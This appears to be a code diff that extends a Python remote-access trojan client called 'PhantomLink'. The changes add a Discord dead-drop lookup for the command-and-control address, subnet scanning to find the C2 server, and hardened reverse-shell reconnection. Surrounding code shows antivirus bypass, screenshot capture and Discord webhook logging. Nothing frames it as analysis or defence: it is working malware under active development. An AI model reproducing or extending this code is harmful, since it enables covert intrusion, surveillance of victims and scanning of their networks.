@@ -44,8 +44,27 @@ def bypass_all_security():
         discord_logger(f"[!] AV Bypass error: {e}")
         return False
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from config import DISCORD_WEBHOOK
+_ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+if _ROOT_DIR not in sys.path:
+    sys.path.insert(0, _ROOT_DIR)
+if getattr(sys, 'frozen', False):
+    _MEI_DIR = getattr(sys, '_MEIPASS', '')
+    if _MEI_DIR and _MEI_DIR not in sys.path:
+        sys.path.insert(0, _MEI_DIR)
+
+try:
+    from config import DISCORD_WEBHOOK, SERVER_IP, CLIENT_PASSWORD
+    if SERVER_IP and SERVER_IP != "0.0.0.0":
+        HOST = SERVER_IP
+except ImportError:
+    try:
+        from client.config import DISCORD_WEBHOOK, SERVER_IP, CLIENT_PASSWORD
+        if SERVER_IP and SERVER_IP != "0.0.0.0":
+            HOST = SERVER_IP
+    except ImportError:
+        # Never default to a live webhook URL in source: it is a secret.
+        DISCORD_WEBHOOK = os.getenv("PHANTOMLINK_WEBHOOK", "")
+        CLIENT_PASSWORD = os.getenv("PHANTOMLINK_PASSWORD", "PhantomLink")
 
 
 def _send_discord_message(log):
@@ -678,6 +697,98 @@ class ScreenshotModule:
         threading.Thread(target=self.capture_loop, daemon=True).start()
 
 
+def fetch_discord_c2_beacon():
+    """Fetch active C2 Server IP from Discord Webhook / Channel messages"""
+    import urllib.request
+    import json
+    try:
+        req = urllib.request.Request(
+            "https://discord.com/api/v9/channels/1525081606501568577/messages?limit=10",
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        )
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            messages = json.loads(resp.read().decode('utf-8'))
+            for msg in messages:
+                content = msg.get("content", "")
+                if "[PHANTOMLINK_C2_HOST]" in content:
+                    parts = content.split("[PHANTOMLINK_C2_HOST]")[1].strip().split()
+                    if parts:
+                        ip = parts[0].strip()
+                        if ip and ip != "127.0.0.1":
+                            return ip
+    except Exception:
+        pass
+    return None
+
+
+def discover_c2_server(port=5000):
+    """Auto-discover active C2 Server on priority WAN/LAN IPs or local network subnets"""
+    priority_ips = ["202.28.78.213", "10.80.87.150"]
+    try:
+        from config import SERVER_IP
+        if SERVER_IP and SERVER_IP not in priority_ips:
+            priority_ips.insert(0, SERVER_IP)
+    except Exception:
+        pass
+
+    for pip in priority_ips:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            res = s.connect_ex((pip, port))
+            s.close()
+            if res == 0:
+                return pip
+        except Exception:
+            pass
+
+    import concurrent.futures
+    local_ips = []
+    try:
+        hostname = socket.gethostname()
+        for ip in socket.gethostbyname_ex(hostname)[2]:
+            if not ip.startswith("127."):
+                local_ips.append(ip)
+    except Exception:
+        pass
+
+    subnets = set()
+    for ip in local_ips:
+        parts = ip.split(".")
+        if len(parts) == 4:
+            subnets.add(f"{parts[0]}.{parts[1]}.{parts[2]}")
+
+    if not subnets:
+        subnets.update(["192.168.1", "192.168.0", "10.80.87", "10.0.0", "172.16.0"])
+
+    discovered = [None]
+
+    def check_ip(target_ip):
+        if discovered[0]:
+            return None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.15)
+            res = s.connect_ex((target_ip, port))
+            s.close()
+            if res == 0:
+                discovered[0] = target_ip
+                return target_ip
+        except Exception:
+            pass
+        return None
+
+    candidate_ips = [f"{net}.{i}" for net in subnets for i in range(1, 255)]
+    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
+        futures = [executor.submit(check_ip, ip) for ip in candidate_ips]
+        for future in concurrent.futures.as_completed(futures):
+            res = future.result()
+            if res:
+                return res
+
+    return None
+
+
 class ShellClient:
     def __init__(self):
         self.socket = None
@@ -758,22 +869,38 @@ class ShellClient:
         return data
 
     def connect_to_server(self):
-        """Connect to server with exponential backoff"""
+        """Connect to server with auto-discovery and exponential backoff"""
+        global HOST
         backoff_time = 1
         max_backoff = 300  # 5 minutes max
 
         while not self.should_exit:
             try:
-                print(f"[*] Attempting to connect to {HOST}:{PORT}")
+                target_host = HOST
+                print(f"[*] Attempting to connect to {target_host}:{PORT}")
 
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                self.socket.settimeout(300.0)  # 3 minutes timeout to match server
+                self.socket.settimeout(300.0)
 
-                self.socket.connect((HOST, PORT))
+                try:
+                    self.socket.connect((target_host, PORT))
+                except Exception as conn_err:
+                    print(f"[*] Direct connection to {target_host} failed ({conn_err}). Auto-discovering C2 Server...")
+                    discovered = discover_c2_server(PORT)
+                    if discovered:
+                        print(f"[+] Auto-discovered C2 Server at {discovered}! Connecting...")
+                        target_host = discovered
+                        HOST = discovered
+                        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                        self.socket.settimeout(300.0)
+                        self.socket.connect((target_host, PORT))
+                    else:
+                        raise conn_err
 
                 # Send credentials
-                password = "PhantomLink"
+                password = CLIENT_PASSWORD
                 if not self._send_message(password):
                     discord_logger(f"{self.username}\n[!] Failed to send password")
                     raise Exception("Failed to send password")
@@ -782,8 +909,8 @@ class ShellClient:
                     raise Exception("Failed to send username")
 
                 self.connected = True
-                print(f"[+] Connected to server as {self.username}")
-                discord_logger(f"[+] [{self.username}] Connected to server")
+                print(f"[+] Connected to server at {target_host} as {self.username}")
+                discord_logger(f"[+] [{self.username}] Connected to server at {target_host}")
                 time.sleep(2)
                 backoff_time = 1
                 return True
@@ -792,7 +919,8 @@ class ShellClient:
                 print(f"[!] Connection failed: {e}")
                 discord_logger(f"[{self.username}]\n[!] Connection failed: {e}")
                 try:
-                    self.socket.close()
+                    if self.socket:
+                        self.socket.close()
                 except Exception:
                     pass
 
